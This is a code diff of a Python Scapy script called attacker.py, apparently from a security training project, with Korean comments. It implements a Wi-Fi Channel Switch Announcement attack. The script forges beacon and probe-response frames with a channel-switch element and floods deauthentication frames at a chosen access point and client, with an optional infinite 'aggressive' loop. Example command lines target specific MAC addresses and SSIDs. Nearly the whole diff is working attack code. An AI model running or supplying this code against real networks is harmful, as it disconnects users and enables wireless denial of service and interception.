@@ -3,30 +3,51 @@ import time
 import sys
 import argparse
 import re
+import threading
 
 parser = None
-
+#conf.verb=0
+#핸드폰의 경우 유니캐스트로 연결을 끊는것은 불가능함
+#python3 attacker.py -i mon0 -a 24:4b:fe:ac:1e:f0 -v KITRI_DEV2.4 -c 13 -d broadcast =>  확인완료
+#python3 attacker.py -i mon0 -a 24:4b:fe:ac:1e:f4 -v KITRI_DEV5 -c 100 -d broadcast
+#python3 attacker.py -i mon0 -a 24:4b:fe:ac:1e:f0 -s 2c:6d:c1:32:90:ba -v KITRI_DEV2.4 -c 13 -d unicast --aggressive True => 밥트북 빼고 확인 완료
+#python3 attacker.py -i mon0 -a 24:4b:fe:ac:1e:f4 -s 2c:6d:c1:32:90:ba -v KITRI_DEV5 -c 13 -d unicast --aggressive True
 def csa_attack(parser):
+	#Broadcast CSA Attack
 	if is_broadcast(parser):
-		packet = capture_beacon(parser)
-		print(packet)
-	
+		sniff(iface=parser.interface, stop_filter = stop_filter_beacon)
+
+	#ProbeResponse CSA Attack
 	else:
-		dot11 = Dot11(type=0, subtype=0x5, addr1=parser.sta, addr2=parser.ap, addr3=parser.ap)
+		#sniff(iface=parser.interface, stop_filter = stop_filter_probe)
+		dot11 = Dot11(type=0, subtype=5, addr1=parser.sta, addr2=parser.ap, addr3=parser.ap)
 		probe_resp = Dot11ProbeResp(cap=0x1111)
-		essid = Dot11Elt(ID='SSID', info=ssid, len=len(ssid))
-		csa = Dot11Elt(ID=0x25,len=3,info='\x00\x0b\x01')
+		essid = Dot11Elt(ID='SSID', info=parser.ssid, len=len(parser.ssid))
+		ds_param = Dot11EltDSSSet(ID=0x3, len=1, channel=parser.channel)
+		csa = Dot11Elt(ID=0x25,len=3,info='\x01\x24\x01')
+		probeRespFrame = RadioTap()/dot11/probe_resp/essid/ds_param/csa
 
-		probeRespFrame = RadioTap()/dot11/probe_resp/essid/csa
+		dot11_deauth = Dot11(type=0, subtype=0xc, addr1=parser.sta, addr2=parser.ap, addr3=parser.ap)
+		deauth = Dot11Deauth(reason=7)
+		deauthFrame = RadioTap()/dot11_deauth/deauth
+		print("csa packet")
+		hexdump(probeRespFrame)
+		print("deauth packet")
+		hexdump(deauthFrame)
+		
+		t = threading.Thread(target=send_deauth,args=(parser, deauthFrame))
+		t.start()
 
-		print('[*] Start...!!')
-		sendp(probeRespFrame, iface=iface, inter=0.004, loop=1)
-		dsparam = Dot11Elt(ID=0x3,len=1,info=b'\x28')
+		if parser.aggressive == True:
+			sendp(probeRespFrame, iface=parser.interface, inter=0.004, loop=1)
+		else:
+			sendp(probeRespFrame, iface=parser.interface, count=6)
 
-		csa = Dot11Elt(ID=0x25,len=3,info=b'\x00\xff\x01')
-
-		frame = RadioTap()/dot11/beacon/essid/csa
-
+def send_deauth(parser, deauth_frame):
+	if parser.aggressive == True:
+		sendp(deauth_frame, iface=parser.interface, inter=0.004, loop=1)
+	else:
+		sendp(deauth_frame, iface=parser.interface, count=6)
 
 def is_broadcast(parser):
 	if parser.casting == "broadcast":
@@ -34,15 +55,42 @@ def is_broadcast(parser):
 	else:
 		return False
 
-def capture_beacon(parser):
-	return sniff(iface=parser.interface, prn = PacketHandler)
-
-def PacketHandler(packet):
+def stop_filter_beacon(packet):
 	if packet.haslayer(Dot11Beacon):
+		elt = packet.getlayer(Dot11Elt)
 		dot11 = packet.getlayer(Dot11)
-		if dot11.addr1 == parser.ap:
-			print(packet)
-			return packet
+		beacon = packet.getlayer(Dot11Beacon)
+		flag = False
+		if dot11.addr3 == parser.ap:
+			print("original packet")
+			hexdump(packet)
+			dot11_beacon = Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff', addr2=parser.ap, addr3=parser.ap)
+			beacon = Dot11Beacon(cap=0o411)
+			frame = RadioTap()/dot11_beacon/beacon
+			csa = Dot11Elt(ID=0x25,len=3,info='\x01\x24\x01')
+
+			while elt != None:
+				if elt.ID > 37 and flag == False:
+					flag = True
+					frame = frame/csa
+				information_element = Dot11Elt(ID=elt.ID, len=elt.len, info=elt.info)
+				frame = frame/information_element
+				elt = elt.payload.getlayer(Dot11Elt)
+
+			print("csa packet")
+			hexdump(frame)
+
+			if parser.aggressive == True:
+				sendp(frame, iface=parser.interface, inter=0.004, loop=1)	
+			else:
+				sendp(frame, iface=parser.interface, count = 6)
+			return True
+			
+	return False
+
+
+def stop_filter_probe(packet):
+	return False
 
 class PARSER:
 	def __init__(self, opts):
@@ -50,7 +98,7 @@ class PARSER:
 		self.interface = self.interface(opts.interface)
 		self.channel = self.channel(opts.channel)
 		self.ap = self.mac(opts.ap)
-
+		self.ssid = opts.ssid
 		self.casting = self.cast(opts.cast)
 
 		if self.casting == "unicast":
@@ -142,7 +190,7 @@ if __name__ == '__main__':
 	parser.add_argument('--aggressive', dest='aggressive', default=False, type=bool)
 
 	options = parser.parse_args()
-	global parser = PARSER(options)
-	#print(f"interface: {parser.interface}\nChannel: {parser.channel}\nAP: {parser.ap}\nSTA: {parser.sta}\ncasting: {parser.casting}")
+	parser = PARSER(options)
+	#print(f"interface: {parser.interface}\nChannel: {parser.channel}\nAP: {parser.ap}\nSSID: {parser.ssid}\ncasting: {parser.casting}")
 
 	csa_attack(parser)
